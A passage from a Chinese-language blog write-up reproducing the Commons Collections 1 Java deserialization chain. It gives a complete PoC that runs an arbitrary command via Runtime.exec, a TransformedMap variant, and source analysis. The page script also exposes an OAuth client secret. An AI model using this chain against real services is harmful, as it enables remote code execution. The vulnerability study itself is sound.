oos<span style=color:#f92672>.</span><span style=color:#a6e22e>writeObject</span><span style=color:#f92672>(</span>handler<span style=color:#f92672>);</span>
oos<span style=color:#f92672>.</span><span style=color:#a6e22e>close</span><span style=color:#f92672>();</span>
</code></pre></div><h3 id=测试-poc>测试 PoC</h3><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#f92672>package</span> top.causality.vulns.demos<span style=color:#f92672>;</span>

<span style=color:#f92672>import</span> org.apache.commons.collections.Transformer<span style=color:#f92672>;</span>
<span style=color:#f92672>import</span> org.apache.commons.collections.functors.ChainedTransformer<span style=color:#f92672>;</span>
<span style=color:#f92672>import</span> org.apache.commons.collections.functors.ConstantTransformer<span style=color:#f92672>;</span>
<span style=color:#f92672>import</span> org.apache.commons.collections.functors.InvokerTransformer<span style=color:#f92672>;</span>
<span style=color:#f92672>import</span> org.apache.commons.collections.map.LazyMap<span style=color:#f92672>;</span>

<span style=color:#f92672>import</span> java.io.*<span style=color:#f92672>;</span>
<span style=color:#f92672>import</span> java.lang.annotation.Retention<span style=color:#f92672>;</span>
<span style=color:#f92672>import</span> java.lang.reflect.Constructor<span style=color:#f92672>;</span>
<span style=color:#f92672>import</span> java.lang.reflect.InvocationHandler<span style=color:#f92672>;</span>
<span style=color:#f92672>import</span> java.lang.reflect.InvocationTargetException<span style=color:#f92672>;</span>
<span style=color:#f92672>import</span> java.lang.reflect.Proxy<span style=color:#f92672>;</span>
<span style=color:#f92672>import</span> java.util.HashMap<span style=color:#f92672>;</span>
<span style=color:#f92672>import</span> java.util.Map<span style=color:#f92672>;</span>

<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>CommonsCollections1</span> <span style=color:#f92672>{</span>

    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span><span style=color:#f92672>(</span>String<span style=color:#f92672>[]</span> args<span style=color:#f92672>)</span> <span style=color:#66d9ef>throws</span> ClassNotFoundException<span style=color:#f92672>,</span> NoSuchMethodException<span style=color:#f92672>,</span> IllegalAccessException<span style=color:#f92672>,</span> InvocationTargetException<span style=color:#f92672>,</span> InstantiationException<span style=color:#f92672>,</span> IOException <span style=color:#f92672>{</span>

        <span style=color:#66d9ef>final</span> String<span style=color:#f92672>[]</span> execArgs <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> String<span style=color:#f92672>[]</span> <span style=color:#f92672>{</span> args<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span> <span style=color:#f92672>};</span>

        <span style=color:#66d9ef>final</span> Transformer<span style=color:#f92672>[]</span> transformers <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Transformer<span style=color:#f92672>[]{</span>
                <span style=color:#66d9ef>new</span> ConstantTransformer<span style=color:#f92672>(</span>Runtime<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>),</span>
                <span style=color:#66d9ef>new</span> InvokerTransformer<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;getMethod&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]{</span>
                        String<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> Class<span style=color:#f92672>[].</span><span style=color:#a6e22e>class</span><span style=color:#f92672>},</span> <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]{</span>
                        <span style=color:#e6db74>&#34;getRuntime&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span>
                <span style=color:#f92672>}),</span>
                <span style=color:#66d9ef>new</span> InvokerTransformer<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;invoke&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]{</span>
                        Object<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> Object<span style=color:#f92672>[].</span><span style=color:#a6e22e>class</span><span style=color:#f92672>},</span> <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]{</span>
                        <span style=color:#66d9ef>null</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span>
                <span style=color:#f92672>}),</span>
                <span style=color:#66d9ef>new</span> InvokerTransformer<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;exec&#34;</span><span style=color:#f92672>,</span>
                        <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]{</span>String<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>},</span> execArgs
                <span style=color:#f92672>),</span>
        <span style=color:#f92672>};</span>
        <span style=color:#66d9ef>final</span> Transformer transformerChain <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ChainedTransformer<span style=color:#f92672>(</span>transformers<span style=color:#f92672>);</span>

        <span style=color:#66d9ef>final</span> Map innerMap <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>();</span>
        <span style=color:#66d9ef>final</span> Map lazyMap <span style=color:#f92672>=</span> LazyMap<span style=color:#f92672>.</span><span style=color:#a6e22e>decorate</span><span style=color:#f92672>(</span>innerMap<span style=color:#f92672>,</span> transformerChain<span style=color:#f92672>);</span>

        Class cls <span style=color:#f92672>=</span> Class<span style=color:#f92672>.</span><span style=color:#a6e22e>forName</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span style=color:#f92672>);</span>
        Constructor constructor <span style=color:#f92672>=</span> cls<span style=color:#f92672>.</span><span style=color:#a6e22e>getDeclaredConstructor</span><span style=color:#f92672>(</span>Class<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> Map<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>);</span>
        constructor<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
        InvocationHandler handler <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>InvocationHandler<span style=color:#f92672>)</span> constructor<span style=color:#f92672>.</span><span style=color:#a6e22e>newInstance</span><span style=color:#f92672>(</span>Retention<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> lazyMap<span style=color:#f92672>);</span>

        Map proxyMap <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>Map<span style=color:#f92672>)</span> Proxy<span style=color:#f92672>.</span><span style=color:#a6e22e>newProxyInstance</span><span style=color:#f92672>(</span>Map<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getClassLoader</span><span style=color:#f92672>(),</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]{</span>Map<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>},</span> handler<span style=color:#f92672>);</span>
        handler <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>InvocationHandler<span style=color:#f92672>)</span> constructor<span style=color:#f92672>.</span><span style=color:#a6e22e>newInstance</span><span style=color:#f92672>(</span>Retention<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> proxyMap<span style=color:#f92672>);</span>

        ByteArrayOutputStream baos <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ByteArrayOutputStream<span style=color:#f92672>();</span>
        ObjectOutputStream oos <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectOutputStream<span style=color:#f92672>(</span>baos<span style=color:#f92672>);</span>
        oos<span style=color:#f92672>.</span><span style=color:#a6e22e>writeObject</span><span style=color:#f92672>(</span>handler<span style=color:#f92672>);</span>
        oos<span style=color:#f92672>.</span><span style=color:#a6e22e>close</span><span style=color:#f92672>();</span>

        <span style=color:#75715e>// test poc
</span><span style=color:#75715e></span>        ObjectInputStream ois <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectInputStream<span style=color:#f92672>(</span>
                <span style=color:#66d9ef>new</span> ByteArrayInputStream<span style=color:#f92672>(</span>baos<span style=color:#f92672>.</span><span style=color:#a6e22e>toByteArray</span><span style=color:#f92672>()));</span>
        Object o <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>Object<span style=color:#f92672>)</span> ois<span style=color:#f92672>.</span><span style=color:#a6e22e>readObject</span><span style=color:#f92672>();</span>
    <span style=color:#f92672>}</span>
<span style=color:#f92672>}</span>
</code></pre></div><p>运行这个程序（Jdk7u80），弹出了计算器：</p><p><img src=https://causality-blog.oss-cn-hangzhou.aliyuncs.com/hugo/vulns/deSerial/cc1/image-20210511104607870.png alt=image-20210511104607870></p><h2 id=另一个poc>另一个PoC</h2><p>在学习CC1过程中，还看到另一个广泛使用的gadget，其使用的不是lazyMap，而是使用TransformedMap.decorate()方法：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java>Map outerMap <span style=color:#f92672>=</span> TransformedMap<span style=color:#f92672>.</span><span style=color:#a6e22e>decorate</span><span style=color:#f92672>(</span>innerMap<span style=color:#f92672>,</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>,</span> transformerChain<span style=color:#f92672>);</span>
outerMap<span style=color:#f92672>.</span><span style=color:#a6e22e>put</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;key&#34;</span><span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;value&#34;</span><span style=color:#f92672>);</span>
</code></pre></div><p>这里的原理可以看出有些许不同，之前的lazyMap是使用get()，原因是在调用get时如果调用到了不存在的值就会调用transform；而这里的TransformedMap则是对Map进行一个修饰，被修饰过的Map添加新元素时就会执行transformerChain：</p><p><img src=https://causality-blog.oss-cn-hangzhou.aliyuncs.com/hugo/vulns/deSerial/cc1/image-20210511105448028.png alt=image-20210511105448028></p><p>因此这里使用的时put方法来触发设计的链。</p><blockquote><p>这里对put设置的键有要求，这与序列化的注解有关，一般序列化Retention时，需要设置键为value，也就是<code>put("value", "xxx")</code>，具体的原因在后面会解释。</p></blockquote><p>相对的，使用这条链构造PoC时不需要考虑寻找get了，因为readObject中存在调用的方法（setValue）：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java>		<span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>memberType <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>  <span style=color:#75715e>// i.e. member still exists
</span><span style=color:#75715e></span>                Object value <span style=color:#f92672>=</span> memberValue<span style=color:#f92672>.</span><span style=color:#a6e22e>getValue</span><span style=color:#f92672>();</span>
                <span style=color:#66d9ef>if</span> <span style=color:#f92672>(!(</span>memberType<span style=color:#f92672>.</span><span style=color:#a6e22e>isInstance</span><span style=color:#f92672>(</span>value<span style=color:#f92672>)</span> <span style=color:#f92672>||</span>
                      value <span style=color:#66d9ef>instanceof</span> ExceptionProxy<span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
                    memberValue<span style=color:#f92672>.</span><span style=color:#a6e22e>setValue</span><span style=color:#f92672>(</span>
                        <span style=color:#66d9ef>new</span> AnnotationTypeMismatchExceptionProxy<span style=color:#f92672>(</span>
                            value<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>()</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;[&#34;</span> <span style=color:#f92672>+</span> value <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;]&#34;</span><span style=color:#f92672>).</span><span style=color:#a6e22e>setMember</span><span style=color:#f92672>(</span>
                                annotationType<span style=color:#f92672>.</span><span style=color:#a6e22e>members</span><span style=color:#f92672>().</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>name<span style=color:#f92672>)));</span>
                <span style=color:#f92672>}</span>
</code></pre></div><p>但是这里还有一个问题，并不是所有的数据都会触发这个方法，只有当<code>memberType != null</code>时才会调用，那么接下来看看memberType什么情况下不为0。</p><blockquote><p>P牛的代码审计简单阐述了使之成立必须满足的两个条件：</p><ol><li>sun.reflect.annotation.AnnotationInvocationHandler 构造函数的第⼀个参数必须是 Annotation的子类，且其中必须含有至少一个方法，假定其为是X</li><li>被 TransformedMap.decorate 修饰的Map中必须有⼀个键名为X的元素</li></ol></blockquote><p>向上看可以看到：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java>            String name <span style=color:#f92672>=</span> memberValue<span style=color:#f92672>.</span><span style=color:#a6e22e>getKey</span><span style=color:#f92672>();</span>
            Class<span style=color:#f92672>&lt;?&gt;</span> memberType <span style=color:#f92672>=</span> memberTypes<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>name<span style=color:#f92672>);</span>
</code></pre></div><p>这里有一个name，其是Map中的键值；然后是memberTypes：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java>        AnnotationType annotationType <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
            annotationType <span style=color:#f92672>=</span> AnnotationType<span style=color:#f92672>.</span><span style=color:#a6e22e>getInstance</span><span style=color:#f92672>(</span>t<span style=color:#f92672>);</span>
        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span><span style=color:#f92672>(</span>IllegalArgumentException e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
            <span style=color:#75715e>// Class is no longer an annotation type; all bets are off
</span><span style=color:#75715e></span>            <span style=color:#66d9ef>return</span><span style=color:#f92672>;</span>
        <span style=color:#f92672>}</span>

        Map<span style=color:#f92672>&lt;</span>String<span style=color:#f92672>,</span> Class<span style=color:#f92672>&lt;?&gt;&gt;</span> memberTypes <span style=color:#f92672>=</span> annotationType<span style=color:#f92672>.</span><span style=color:#a6e22e>memberTypes</span><span style=color:#f92672>();</span>
</code></pre></div><p>最后一个语句给memberTypes进行了赋值，根据这条语句memberTypes值与annotationTypes有关，所以要首先了解<a href=https://github.com/openjdk-mirror/jdk7u-jdk/blob/f4d80957e89a19a29bb9f9807d2a28351ed7f7df/src/share/classes/sun/reflect/annotation/AnnotationType.java>AnnotationType</a>类，接下来一个一个分析相关的方法。</p><p>先看一眼构造函数，这里截取了和memberTypes相关的部分代码：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java>	<span style=color:#66d9ef>for</span> <span style=color:#f92672>(</span>Method method <span style=color:#f92672>:</span>  methods<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
            <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>method<span style=color:#f92672>.</span><span style=color:#a6e22e>getParameterTypes</span><span style=color:#f92672>().</span><span style=color:#a6e22e>length</span> <span style=color:#f92672>!=</span> 0<span style=color:#f92672>)</span>
                <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> IllegalArgumentException<span style=color:#f92672>(</span>method <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34; has params&#34;</span><span style=color:#f92672>);</span>
            String name <span style=color:#f92672>=</span> method<span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>();</span>
            Class<span style=color:#f92672>&lt;?&gt;</span> type <span style=color:#f92672>=</span> method<span style=color:#f92672>.</span><span style=color:#a6e22e>getReturnType</span><span style=color:#f92672>();</span>
            memberTypes<span style=color:#f92672>.</span><span style=color:#a6e22e>put</span><span style=color:#f92672>(</span>name<span style=color:#f92672>,</span> invocationHandlerReturnType<span style=color:#f92672>(</span>type<span style=color:#f92672>));</span>
            members<span style=color:#f92672>.</span><span style=color:#a6e22e>put</span><span style=color:#f92672>(</span>name<span style=color:#f92672>,</span> method<span style=color:#f92672>);</span>

            Object defaultValue <span style=color:#f92672>=</span> method<span style=color:#f92672>.</span><span style=color:#a6e22e>getDefaultValue</span><span style=color:#f92672>();</span>
            <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>defaultValue <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span>
                memberDefaults<span style=color:#f92672>.</span><span style=color:#a6e22e>put</span><span style=color:#f92672>(</span>name<span style=color:#f92672>,</span> defaultValue<span style=color:#f92672>);</span>

            members<span style=color:#f92672>.</span><span style=color:#a6e22e>put</span><span style=color:#f92672>(</span>name<span style=color:#f92672>,</span> method<span style=color:#f92672>);</span>
        <span style=color:#f92672>}</span>

</code></pre></div><p>可以看出，这里memberTypes存储的是注解下方法的名称和返回值类型，然后看看getInstance：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java>	<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>synchronized</span> AnnotationType <span style=color:#a6e22e>getInstance</span><span style=color:#f92672>(</span>
Class<span style=color:#f92672>&lt;?</span> <span style=color:#66d9ef>extends</span> Annotation<span style=color:#f92672>&gt;</span> annotationClass<span style=color:#f92672>)</span>
    <span style=color:#f92672>{</span>
        AnnotationType result <span style=color:#f92672>=</span> sun<span style=color:#f92672>.</span><span style=color:#a6e22e>misc</span><span style=color:#f92672>.</span><span style=color:#a6e22e>SharedSecrets</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getJavaLangAccess</span><span style=color:#f92672>().</span>
            getAnnotationType<span style=color:#f92672>(</span>annotationClass<span style=color:#f92672>);</span>
        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>result <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span>
            result <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> AnnotationType<span style=color:#f92672>((</span>Class<span style=color:#f92672>&lt;?</span> <span style=color:#66d9ef>extends</span> Annotation<span style=color:#f92672>&gt;)</span> annotationClass<span style=color:#f92672>);</span>

        <span style=color:#66d9ef>return</span> result<span style=color:#f92672>;</span>
    <span style=color:#f92672>}</span>    
</code></pre></div><p>这个方法的作用是返回一个给定注解类型的注解实例；所以这里会根据t返回一个annotationType对象，</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java>	ObjectInputStream<span style=color:#f92672>.</span><span style=color:#a6e22e>GetField</span> fields <span style=color:#f92672>=</span> s<span style=color:#f92672>.</span><span style=color:#a6e22e>readFields</span><span style=color:#f92672>();</span>

	<span style=color:#a6e22e>@SuppressWarnings</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;unchecked&#34;</span><span style=color:#f92672>)</span>
	Class<span style=color:#f92672>&lt;?</span> <span style=color:#66d9ef>extends</span> Annotation<span style=color:#f92672>&gt;</span> t <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>Class<span style=color:#f92672>&lt;?</span> <span style=color:#66d9ef>extends</span> Annotation<span style=color:#f92672>&gt;)</span>fields<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;type&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>);</span>
</code></pre></div><p>这里获取到了序列化对象s的实例域，然后使用fields.get(&ldquo;type&rdquo;, null)获取到名为type的实例域的值。</p><p>稍微整理一下：我们之前序列化的对象是AnnotationInvocationHandler，也就是说，会在AnnotationInvocationHandler找到一个type实例域并获取到它的值，而这里type实例域的值存储的就是注解的类型，因此这里实际上也就是获取注解的类型。然后根据这个值获取到一个AnnotationType对象，然后再获取到这个对象的memberTypes。</p><p>到此基本就可以理解使<code>memberType!=null</code>的原理了：</p><ul><li>首先，满足这个条件的核心语句是 <code>memberTypes.get(name)</code></li><li>memberTypes来自我们的注解，其类型Map，存储了注解中方法名称与返回值类型之间的映射关系；</li><li>name来自于我们设计的Map，是Map的键名；</li><li>所以这条语句会根据Map中的键获取注解中这个方法的返回值类型；也就是说，如果Map中存在一个键，而注解中存在一个和这个键名相同的方法，那么就会返回这个方法的返回值类型；所以相反的，如果不存在就会返回null；</li><li>因此，为了使条件成立，必须向Map中设置一个注解中存在的方法名称作为键名。</li></ul><p>OK，到此算是理清了这个关系，可以来验证一下。</p><h3 id=测试>测试</h3><p>这里注解类使用的使<code>Retention</code>，其存在一个方法为value()：</p><p><img src=https://causality-blog.oss-cn-hangzhou.aliyuncs.com/hugo/vulns/deSerial/cc1/image-20210525093748345.png alt=image-20210525093748345></p><p>所以这里必须设置键为“value”：</p><p><img src=https://causality-blog.oss-cn-hangzhou.aliyuncs.com/hugo/vulns/deSerial/cc1/image-20210525093840711.png alt=image-20210525093840711></p><p>运行可以弹出计算器：</p><p><img src=https://causality-blog.oss-cn-hangzhou.aliyuncs.com/hugo/vulns/deSerial/cc1/image-20210525093918730.png alt=image-20210525093918730></p><p>如果设置为其他值就不会弹出：</p><p><img src=https://causality-blog.oss-cn-hangzhou.aliyuncs.com/hugo/vulns/deSerial/cc1/image-20210525094006296.png alt=image-20210525094006296></p><h2 id=总结>总结</h2><p>之前玩CTF主要搞PHP，也学过PHP反序列化漏洞的利用，但是现在看Java反序列化利用的思路和PHP差别很大。</p><p>PHP反序列化主要是从序列化后的字符串和类本身着手进行利用，而Java则不同，Java本身对象与类具有一致性，没有办法简单的通过序列化后的对象去操控类本身，因此其利用的最主要思路是寻找可以利用的其他类，也就是想办法触发调用服务器包含的其他类来“合成”一个漏洞，所以如果对Java不熟悉基本是无缘主动挖掘到一个反序列化漏洞了。</p><p>不过相对的，复现这样一个漏洞的价值也响应提高，毕竟在这个过程中遇到新的内容就可以学，这样学到的东西也就更多，复现的多了自然会对Java有一个广泛的了解，反过来就可以尝试挖掘出反序列化漏洞。</p></article><link rel=stylesheet href=https://unpkg.com/gitalk/dist/gitalk.css><script src=https://unpkg.com/gitalk/dist/gitalk.min.js></script><div id=gitalk></div><script>var gitalk=new Gitalk({clientID:'9a04c6b451fbce76511d',clientSecret:'430c540c77ecd6b59749c60f0341c057bd5320a0',repo:'Causa1ity.github.io',owner:'Causa1ity',admin:'Causa1ity',id:'security/vulns/java/cc1',distractionFreeMode:!1});gitalk.render('gitalk')</script></div><div class="flex-initial hidden lg:block lg:w-40 xl:w-60 2xl:w-80"><div class=fixed><h2 class="font-title text-2xl mb-4">Commons Collections 1 复现</h2><div class="font-mono text-xl"><nav id=TableOfContents><ul><li><a href=#利用链分析>利用链分析</a><ul><li><a href=#chainedtransformer>ChainedTransformer</a></li><li><a href=#constanttransformer>ConstantTransformer</a></li><li><a href=#invokertransformer>InvokerTransformer</a></li><li><a href=#transformer-构造链>Transformer 构造链</a></li><li><a href=#map调用>Map调用</a></li></ul></li><li><a href=#demo测试>Demo测试</a></li><li><a href=#构造poc>构造PoC</a><ul><li><a href=#测试-poc>测试 PoC</a></li></ul></li><li><a href=#另一个poc>另一个PoC</a><ul><li><a href=#测试>测试</a></li></ul></li><li><a href=#总结>总结</a></li></ul></nav></div></div></div></div></div><footer class=flex-auto><div class="font-title text-center my-4"><p class=text-lg>Powered By <a href=https://gohugo.io>Hugo</a></p></div></footer></body></html>